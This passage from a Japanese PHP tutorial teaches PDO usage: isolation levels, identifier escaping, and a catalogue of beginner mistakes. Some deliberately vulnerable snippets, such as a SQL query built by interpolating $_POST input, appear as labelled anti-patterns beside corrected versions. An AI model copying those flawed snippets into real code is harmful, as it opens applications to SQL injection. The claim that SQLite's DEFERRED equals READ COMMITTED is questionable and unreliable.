<span id="各データベース製品のデフォルト" class="fragment"></span><a href="#%E5%90%84%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E8%A3%BD%E5%93%81%E3%81%AE%E3%83%87%E3%83%95%E3%82%A9%E3%83%AB%E3%83%88"><i class="fa fa-link"></i></a>各データベース製品のデフォルト</h4>

<ul>
<li>
<strong>MySQL</strong> のInnoDBのデフォルトは <strong><code>REPEATABLE READ</code></strong> である．</li>
<li>
<strong>PostgreSQL</strong> のデフォルトは <strong><code>READ COMMITTED</code></strong> である．</li>
<li>
<strong>SQLite</strong> のデフォルトは <strong><code>DEFERRED</code></strong> であり，これは <code>READ COMMITTED</code> に相当する．</li>
</ul>

<h4>
<span id="分離レベルを設定するsqlの実行" class="fragment"></span><a href="#%E5%88%86%E9%9B%A2%E3%83%AC%E3%83%99%E3%83%AB%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8Bsql%E3%81%AE%E5%AE%9F%E8%A1%8C"><i class="fa fa-link"></i></a>分離レベルを設定するSQLの実行</h4>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">MySQLでの例</span></div>
<div class="highlight"><pre><span></span><span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">exec</span><span class="p">(</span><span class="s1">'SET SESSION TRANSACTION ISOLATION LEVEL SERIALIZABLE'</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">PostgreSQLでの例</span></div>
<div class="highlight"><pre><span></span><span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">exec</span><span class="p">(</span><span class="s1">'SET SESSION CHARACTERISTICS AS TRANSACTION SERIALIZABLE'</span><span class="p">);</span>
</pre></div>
</div>

<h2>
<span id="テーブル名カラム名のエスケープ処理" class="fragment"></span><a href="#%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB%E5%90%8D%E3%82%AB%E3%83%A9%E3%83%A0%E5%90%8D%E3%81%AE%E3%82%A8%E3%82%B9%E3%82%B1%E3%83%BC%E3%83%97%E5%87%A6%E7%90%86"><i class="fa fa-link"></i></a>テーブル名・カラム名のエスケープ処理</h2>

<p>設計としてはあまり宜しくありませんが， <strong>「ユーザーに任意のテーブル名やカラム名を指定させたい」</strong> というケースも考えられなくはないです．PDOクラスにこういったものをエスケープする機能は含まれていないので，自前でエスケープを行わなければなりません．</p>

<ul>
<li>NULLバイトを除外する．</li>
<li>バッククオートを<ins>2つ連ねて</ins>エスケープさせる．</li>
<li>最終的にバッククオートでくくる．</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">テーブル名をエスケープして動的に指定する例</span></div>
<div class="highlight"><pre><span></span><span class="nv">$sql</span> <span class="o">=</span> <span class="nb">sprintf</span><span class="p">(</span>
    <span class="s2">"CREATE TABLE `%s`(id int, name text)"</span><span class="p">,</span>
    <span class="nb">str_replace</span><span class="p">([</span><span class="s2">"</span><span class="se">\0</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"`"</span><span class="p">],</span> <span class="p">[</span><span class="s2">""</span><span class="p">,</span> <span class="s2">"``"</span><span class="p">],</span> <span class="nv">$table_name</span><span class="p">)</span>
<span class="p">);</span>
</pre></div>
</div>

<h2>
<span id="pdoクラスの継承" class="fragment"></span><a href="#pdo%E3%82%AF%E3%83%A9%E3%82%B9%E3%81%AE%E7%B6%99%E6%89%BF"><i class="fa fa-link"></i></a>PDOクラスの継承</h2>

<ul>
<li><a href="http://qiita.com/k-holy/items/ce829a60cafe48bd1f81" id="reference-fa8d32222fea57c24d32">Qiita - PDOでオブジェクトをフェッチ＆JSONとCSVファイル出力</a></li>
<li><a href="http://blog.tojiru.net/article/277021312.html" rel="nofollow noopener" target="_blank">Architect Note - PDOの真の力を開放する - PHPでデータベースを扱う(3)</a></li>
</ul>

<hr>

<hr>

<h1>
<span id="付録" class="fragment"></span><a href="#%E4%BB%98%E9%8C%B2"><i class="fa fa-link"></i></a>付録</h1>

<h2>
<span id="初心者がやりがちなミスの解説" class="fragment"></span><a href="#%E5%88%9D%E5%BF%83%E8%80%85%E3%81%8C%E3%82%84%E3%82%8A%E3%81%8C%E3%81%A1%E3%81%AA%E3%83%9F%E3%82%B9%E3%81%AE%E8%A7%A3%E8%AA%AC"><i class="fa fa-link"></i></a>初心者がやりがちなミスの解説</h2>

<h3>
<span id="mysql_query-などの非推奨関数を利用している" class="fragment"></span><a href="#mysql_query-%E3%81%AA%E3%81%A9%E3%81%AE%E9%9D%9E%E6%8E%A8%E5%A5%A8%E9%96%A2%E6%95%B0%E3%82%92%E5%88%A9%E7%94%A8%E3%81%97%E3%81%A6%E3%81%84%E3%82%8B"><i class="fa fa-link"></i></a><code>mysql_query</code> などの非推奨関数を利用している</h3>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$link</span> <span class="o">=</span> <span class="nb">mysql_connect</span><span class="p">(</span><span class="s1">'localhost'</span><span class="p">,</span> <span class="s1">'root'</span><span class="p">,</span> <span class="s1">'password'</span><span class="p">);</span>
<span class="nb">mysql_select_db</span><span class="p">(</span><span class="s1">'test'</span><span class="p">);</span>
<span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s1">'SELECT * FROM users'</span><span class="p">);</span>
<span class="nv">$rows</span> <span class="o">=</span> <span class="p">[];</span>
<span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
    <span class="nv">$rows</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<p>あなたが参考にしている情報は古すぎます． <code>mysql_</code> で始まる関数は，PHP5.5で非推奨になり，PHP7.0で完全に削除されて使えなくなっています．この記事で解説しているように，PDOを使う方法を覚えてください．</p>

<h3>
<span id="set-names-あるいは-set-character-set-などで文字コードを指定しているそもそもデータベースで使用する文字コードの指定をしていない" class="fragment"></span><a href="#set-names-%E3%81%82%E3%82%8B%E3%81%84%E3%81%AF-set-character-set-%E3%81%AA%E3%81%A9%E3%81%A7%E6%96%87%E5%AD%97%E3%82%B3%E3%83%BC%E3%83%89%E3%82%92%E6%8C%87%E5%AE%9A%E3%81%97%E3%81%A6%E3%81%84%E3%82%8B%E3%81%9D%E3%82%82%E3%81%9D%E3%82%82%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E3%81%A7%E4%BD%BF%E7%94%A8%E3%81%99%E3%82%8B%E6%96%87%E5%AD%97%E3%82%B3%E3%83%BC%E3%83%89%E3%81%AE%E6%8C%87%E5%AE%9A%E3%82%92%E3%81%97%E3%81%A6%E3%81%84%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a><code>SET NAMES</code> あるいは <code>SET CHARACTER SET</code> などで文字コードを指定している<br>そもそもデータベースで使用する文字コードの指定をしていない</h3>

<p>文字コードの指定が無いのは論外として，<code>SET NAMES</code>などを用いるのは可能な限り避けるべきです．このクエリは，データベース側の文字セットを操作するだけで，PDOドライバの文字セットにはノータッチです．入力側と出力側で文字セットが異なると，脆弱性が発生する原因になります．</p>

<ul>
<li>文字コードの性質上， <code>SET NAMES sjis</code> や <code>SET CHARACTER SET sjis</code> とした場合，顕著に脆弱性が現れる．</li>
<li>
<code>SET NAMES utf8</code> や <code>SET CHARACTER SET utf8</code> は基本的には安全だが，例外もあるので注意．  MySQLにおいては，libmysqlclientのコンパイルオプションに <code>--with-charset=cp932</code> や <code>--with-charset=sjis</code> を指定している場合が該当． mysqlndを利用している場合は問題ない．

<ul>
<li><a href="http://blog.everqueue.com/chiba/2009/02/05/129/" rel="nofollow noopener" target="_blank">へぼい日記 - libmysqlclientを使うプログラムはset namesをutf8であっても使ってはいけない</a></li>
</ul>
</li>
</ul>

<p>PDOクラスでの正しい指定方法は，以下のようになります．</p>

<ul>
<li>コンストラクタの <a href="http://www.php.net/manual/ja/ref.pdo-mysql.connection.php" rel="nofollow noopener" target="_blank">DSN(Data Source Name)</a> で指定する．</li>
</ul>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$pdo</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span><span class="s1">'mysql:dbname=test;host=localhost;charset=utf8'</span><span class="p">);</span>
</pre></div></div>

<ul>
<li>PHP5.3.5以前のPDOではDSNで文字セット指定が出来ないため， <code>SET NAMES</code> や <code>SET CHARACTER SET</code> に頼らざるを得ない．但しLinux版では，cnfファイルを利用する選択肢がある．

<ul>
<li><a href="http://qiita.com/ngyuki/items/d88a4df860abb51eb714" id="reference-ab278c62c9b30bc90069">Qiita - PHP 5.3.6より前のバージョンの PDO MySQL で charset を指定する</a></li>
</ul>
</li>
<li>PHP5.3.6Windows版のPDOではDSNで文字セット指定が出来るが，バグがあるため， <code>SET NAMES utf8</code> や <code>SET CHARACTER SET utf8</code> を使う場合と同じ結果になる．</li>
<li>やむを得ず <code>SET NAMES</code> を使うにしても， <code>SET CHARACTER SET</code> は避けるべき．

<ul>
<li><a href="http://dev.mysql.com/doc/refman/4.1/ja/charset-connection.html" rel="nofollow noopener" target="_blank">MySQLマニュアル - SET NAMES と SET CHARACTER SET の違い</a></li>
</ul>
</li>
</ul>

<p>MySQL以外では以下のようになります．</p>

<ul>
<li>PostgreSQLでは，DSNに <code>options='--client_encoding=UTF8'"</code> を含める．</li>
<li>SQLiteでは特に指定する必要が無く，暗黙的にUTF-8が使用される．</li>
</ul>

<h3>
<span id="select--from-users-where-id--id-のように変数展開を使ってsql文を組み立てている" class="fragment"></span><a href="#select--from-users-where-id--id-%E3%81%AE%E3%82%88%E3%81%86%E3%81%AB%E5%A4%89%E6%95%B0%E5%B1%95%E9%96%8B%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%A6sql%E6%96%87%E3%82%92%E7%B5%84%E3%81%BF%E7%AB%8B%E3%81%A6%E3%81%A6%E3%81%84%E3%82%8B"><i class="fa fa-link"></i></a><strong><code>"SELECT * FROM users WHERE id = '$id'"</code> のように変数展開を使ってSQL文を組み立てている</strong>
</h3>

<p>Wikipediaを読むのがてっとり早いです．</p>

<ul>
<li><a href="http://ja.wikipedia.org/wiki/SQL%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3" rel="nofollow noopener" target="_blank">Wikipedia - SQLインジェクション</a></li>
</ul>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT * FROM users WHERE id = '</span><span class="si">$id</span><span class="s2">'"</span><span class="p">;</span>
</pre></div></div>

<p>このようなコードは， <strong>SQLインジェクション攻撃</strong> の格好の標的になってしまうどころか，それを意図せずとも <code>'</code> を含めたクエリで検索を行おうとしたときにも正常な処理が行えなくなってしまいます．これを防ぐために，SQL文中で特別な意味を持つ<code>'</code>をエスケープし，<code>\'</code>に変換する必要があります．</p>

<p><a href="http://php.net/manual/ja/function.mysql-query.php" rel="nofollow noopener" target="_blank">mysql_query</a> 関数を使っていた頃は，以下のような手段でSQL文を組み立てるのが主流でした．</p>

<ol>
<li>
<a href="http://php.net/manual/ja/function.mysql-real-escape-string.php" rel="nofollow noopener" target="_blank">mysql_real_escape_string</a> 関数で文字列をあらかじめエスケープする</li>
<li>変数展開して埋め込む</li>
</ol>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$id</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]);</span>
<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT * FROM users WHERE id = '</span><span class="si">$id</span><span class="s2">'"</span><span class="p">;</span>
</pre></div></div>

<p>但し，もしこの2行の間にたくさんのコードが入っていたらどうでしょうか？</p>

<ul>
<li>あなたは <code>$id</code> がエスケープ済みかそうでないか， <code>$sql</code> を書くところまでしっかり覚えていられますか？</li>
<li>「エスケープ忘れ」「多重エスケープ」という人為的なミスを生んでしまうリスクはないでしょうか？</li>
</ul>

<p>また，手動エスケープにはこんな罠もあります．</p>

<ul>
<li>
<a href="http://www.php.net/manual/ja/function.htmlspecialchars.php" rel="nofollow noopener" target="_blank">htmlspecialchars</a> 関数は <strong>「HTMLの特殊文字」</strong> をエスケープする関数であり， <strong>「SQLの特殊文字」</strong> をエスケープする関数ではない．全く目的が異なる上に，これを通してしまうとHTML特殊文字をデータベースにそのまま格納できないというバグも発生してしまう．</li>
<li>
<a href="http://www.php.net/manual/ja/function.addslashes.php" rel="nofollow noopener" target="_blank">addslashes</a> 関数は一応それっぽくSQL文に対してエスケープが行えるが，本当にそれがデータベースに合わせて正しくエスケープされているかどうかの保証は無い．マニュアルにもそういった注意書きがある．<strong>例えばSQLiteは<code>'</code>を<code>\'</code>ではなく<code>''</code>にエスケープしなければならない．</strong>
</li>
</ul>

<p>PDOを使う方法では，このようなリスクから開放されます．PDOには，<strong>「プリペアドステートメント」</strong>および<strong>「プレースホルダ」</strong>という仕組みが取り入れられています．詳細については本文中で紹介しているので，付録から戻って読んでみてください．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'id'</span><span class="p">];</span>
<span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"SELECT * FROM users WHERE id = ?"</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nv">$id</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_STR</span><span class="p">);</span>
</pre></div></div>

<h3>
<span id="_postid-などの外部入力からきた変数が定義されているかどうか確認していないそれらが文字列であるかどうかの確認をしていないそれらを出力する際に-htmlspecialchars-関数を利用していない" class="fragment"></span><a href="#_postid-%E3%81%AA%E3%81%A9%E3%81%AE%E5%A4%96%E9%83%A8%E5%85%A5%E5%8A%9B%E3%81%8B%E3%82%89%E3%81%8D%E3%81%9F%E5%A4%89%E6%95%B0%E3%81%8C%E5%AE%9A%E7%BE%A9%E3%81%95%E3%82%8C%E3%81%A6%E3%81%84%E3%82%8B%E3%81%8B%E3%81%A9%E3%81%86%E3%81%8B%E7%A2%BA%E8%AA%8D%E3%81%97%E3%81%A6%E3%81%84%E3%81%AA%E3%81%84%E3%81%9D%E3%82%8C%E3%82%89%E3%81%8C%E6%96%87%E5%AD%97%E5%88%97%E3%81%A7%E3%81%82%E3%82%8B%E3%81%8B%E3%81%A9%E3%81%86%E3%81%8B%E3%81%AE%E7%A2%BA%E8%AA%8D%E3%82%92%E3%81%97%E3%81%A6%E3%81%84%E3%81%AA%E3%81%84%E3%81%9D%E3%82%8C%E3%82%89%E3%82%92%E5%87%BA%E5%8A%9B%E3%81%99%E3%82%8B%E9%9A%9B%E3%81%AB-htmlspecialchars-%E9%96%A2%E6%95%B0%E3%82%92%E5%88%A9%E7%94%A8%E3%81%97%E3%81%A6%E3%81%84%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a><code>$_POST['id']</code> などの外部入力からきた変数が定義されているかどうか確認していない<br>それらが文字列であるかどうかの確認をしていない<br><strong>それらを出力する際に <code>htmlspecialchars</code> 関数を利用していない</strong>
</h3>

<p>以下の記事をお読みください．</p>

<ul>
<li><a href="http://qiita.com/mpyw/items/2f9955db1c02eeef43ea" id="reference-83d61b6e0eacee1212f7">Qiita - $_GET, $_POSTなどを受け取る際の処理</a></li>
</ul>

<p>別の場所でも指摘していますが，ただ思考停止して <a href="http://www.php.net/manual/ja/function.htmlspecialchars.php" rel="nofollow noopener" target="_blank">htmlspecialchars</a> 関数を使えばいいというものでもありません．「<ins>出力する際に</ins>」というのがネックです．例えば以下のコードは間違いです．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">データベースに挿入する前にhtmlspecialchars関数を適用している間違った例</span></div>
<div class="highlight"><pre><span></span><span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s1">'INSERT INTO users(name) VALUES(?)'</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$name</span><span class="p">),</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_STR</span><span class="p">);</span>
</pre></div>
</div>

<h3>
<span id="sqlの-like-演算子を使っているのに--_--のエスケープをしていない" class="fragment"></span><a href="#sql%E3%81%AE-like-%E6%BC%94%E7%AE%97%E5%AD%90%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%A6%E3%81%84%E3%82%8B%E3%81%AE%E3%81%AB--_--%E3%81%AE%E3%82%A8%E3%82%B9%E3%82%B1%E3%83%BC%E3%83%97%E3%82%92%E3%81%97%E3%81%A6%E3%81%84%E3%81%AA%E3%81%84"><i class="fa fa-link"></i></a>SQLの <code>LIKE</code> 演算子を使っているのに <code>%</code> <code>_</code> <code>\</code> のエスケープをしていない</h3>

<p>以下のようなコードを書いていたらアウトです．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"SELECT * FROM users WHERE name LIKE ?"</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">"%</span><span class="si">{</span><span class="nv">$name</span><span class="si">}</span><span class="s2">%"</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_STR</span><span class="p">);</span>
</pre></div></div>

<p>プレースホルダを使っているので脆弱性こそありませんが，LIKE演算子による正しい検索が保証されません．正しい実装方法は本文中に記載しています．</p>

<h3>
<span id="htmlの-bodybody-の中にデータベース接続処理を書いているecho-や-print-をベタ書きしているcontent-typeを-textplain-に変更せずに-exit-や-die-で強制終了処理を記述している" class="fragment"></span><a href="#html%E3%81%AE-bodybody-%E3%81%AE%E4%B8%AD%E3%81%AB%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E6%8E%A5%E7%B6%9A%E5%87%A6%E7%90%86%E3%82%92%E6%9B%B8%E3%81%84%E3%81%A6%E3%81%84%E3%82%8Becho-%E3%82%84-print-%E3%82%92%E3%83%99%E3%82%BF%E6%9B%B8%E3%81%8D%E3%81%97%E3%81%A6%E3%81%84%E3%82%8Bcontent-type%E3%82%92-textplain-%E3%81%AB%E5%A4%89%E6%9B%B4%E3%81%9B%E3%81%9A%E3%81%AB-exit-%E3%82%84-die-%E3%81%A7%E5%BC%B7%E5%88%B6%E7%B5%82%E4%BA%86%E5%87%A6%E7%90%86%E3%82%92%E8%A8%98%E8%BF%B0%E3%81%97%E3%81%A6%E3%81%84%E3%82%8B"><i class="fa fa-link"></i></a>HTMLの <code>&lt;body&gt;&lt;/body&gt;</code> の中にデータベース接続処理を書いている<br><code>echo()</code> や <code>print()</code> をベタ書きしている<br>Content-Typeを <code>text/plain</code> に変更せずに <code>exit()</code> や <code>die()</code> で強制終了処理を記述している</h3>

<p>以下のようなコードを書いていたらアウトです．</p>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">"utf-8"</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Example<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span>

<span class="k">try</span> <span class="p">{</span>

    <span class="nv">$pdo</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span><span class="s1">'mysql: ... '</span><span class="p">,</span> <span class="s1">'root'</span><span class="p">,</span> <span class="s1">'password'</span><span class="p">,</span> <span class="p">[</span>
        <span class="nx">PDO</span><span class="o">::</span><span class="na">ATTR_ERRMODE</span> <span class="o">=&gt;</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">ERRMODE_EXCEPTION</span><span class="p">,</span>
    <span class="p">]);</span>
    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">'SELECT * FROM users'</span><span class="p">);</span>
    <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">fetch</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_ASSOC</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">'&lt;li&gt;'</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'name'</span><span class="p">])</span> <span class="o">.</span> <span class="s1">'&lt;/li&gt;'</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">PDOException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>

    <span class="k">exit</span><span class="p">(</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">());</span>    

<span class="p">}</span>

<span class="cp">?&gt;</span>
        <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div></div>

<p>もし，PDOに接続するところで失敗してしまった場合にどうなるでしょうか？きっと，出力されるHTMLはこんな感じになるはずです．</p>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">"utf-8"</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Example<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>No such file or directory
</pre></div></div>

<p>もし，あなたがこんな壊れたHTMLをWebサイト利用者に見られて恥も何も感じないのであれば私は止めませんが，多くの人は気にすると思います．…というよりも，まずこのコードは非常に読みにくいので<strong>「ロジックとテンプレートの分離」</strong>は行いましょう．</p>

<ul>
<li>頭のほうですべてのロジックを書き，そこを過ぎたら<ins>用意された変数を使ってHTMLを出力する以外のことは行ってはいけません</ins>． （理想を言えば，ファイルも分けるべき） </li>
<li>広々と確保した <code>&lt;?php ... ?&gt;</code> 中で <a href="http://www.php.net/manual/ja/function.echo.php" rel="nofollow noopener" target="_blank">echo</a> や <a href="http://www.php.net/manual/ja/function.print.php" rel="nofollow noopener" target="_blank">print</a> を連呼してHTMLを生成するのは，初心者が陥りやすい典型的な間違ったPHPの使い方です．PHPはこれでも<strong>テンプレートエンジン</strong>的な役割を持つ言語なので，上記で指摘したロジックとテンプレートの分離を行った後は，<ins>PHPの中にHTMLを埋め込むのではなく，<strong>HTMLの中にPHPを埋め込む</strong>感覚で書きましょう</ins>．</li>
</ul>

<p>上記2点に関して，以下に修正した例を示します．</p>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="k">try</span> <span class="p">{</span>

    <span class="nv">$pdo</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span><span class="s1">'mysql: ... '</span><span class="p">,</span> <span class="s1">'root'</span><span class="p">,</span> <span class="s1">'password'</span><span class="p">,</span> <span class="p">[</span>
        <span class="nx">PDO</span><span class="o">::</span><span class="na">ATTR_ERRMODE</span> <span class="o">=&gt;</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">ERRMODE_EXCEPTION</span><span class="p">,</span>
    <span class="p">]);</span>
    <span class="nv">$rows</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">'SELECT * FROM users'</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">fetchAll</span><span class="p">(</span><span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_ASSOC</span><span class="p">);</span>

<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">PDOException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>

    <span class="k">exit</span><span class="p">(</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">());</span>    

<span class="p">}</span>

<span class="k">function</span> <span class="nf">h</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
<span class="p">}</span>

<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">"utf-8"</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Example<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
        <span class="p">&lt;</span><span class="nt">ul</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$rows</span> <span class="k">as</span> <span class="nv">$row</span><span class="p">)</span><span class="o">:</span> <span class="cp">?&gt;</span>
            <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$row</span><span class="p">)</span><span class="cp">?&gt;</span><span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
<span class="cp">&lt;?php</span> <span class="k">endforeach</span><span class="p">;</span> <span class="cp">?&gt;</span>
        <span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div></div>

<p><strong><a href="http://www.php.net/manual/ja/function.echo.php" rel="nofollow noopener" target="_blank">echo</a>短縮構文</strong> および <strong><a href="http://php.net/manual/ja/control-structures.alternative-syntax.php" rel="nofollow noopener" target="_blank">制御構造に関する別の構文</a></strong> を用いてみました．この2つはHTMLを出力する際に適用するとコードが非常に読みやすくなります．これで，エラー時に出力されるHTMLは以下のようになります．</p>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span>No such file or directory
</pre></div></div>

<p>ただ，これってもはやHTMLではないですよね？もしエラー時にも丁寧にエラー画面用のHTMLを用意するのであればそれで構わないのですが， <a href="http://www.php.net/manual/ja/function.exit.php" rel="nofollow noopener" target="_blank">exit</a> や <a href="http://www.php.net/manual/ja/function.die.php" rel="nofollow noopener" target="_blank">die</a> で手抜きしたい場合はWebブラウザに<strong>「これはただのテキストです」</strong>と伝えるようにしましょう． <a href="http://www.php.net/manual/ja/function.exit.php" rel="nofollow noopener" target="_blank">exit</a> の前にこの1行を入れてください．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: text/plain; charset=UTF-8'</span><span class="p">,</span> <span class="k">true</span><span class="p">,</span> <span class="mi">500</span><span class="p">);</span>
</pre></div></div>

<p>500は「500 Internal Server Error」の意味で，サーバ側が原因でエラーになってしまったことを表します．</p>

<h2>
<span id="pdoとmysqliの比較" class="fragment"></span><a href="#pdo%E3%81%A8mysqli%E3%81%AE%E6%AF%94%E8%BC%83"><i class="fa fa-link"></i></a>PDOとmysqliの比較</h2>

<h3>
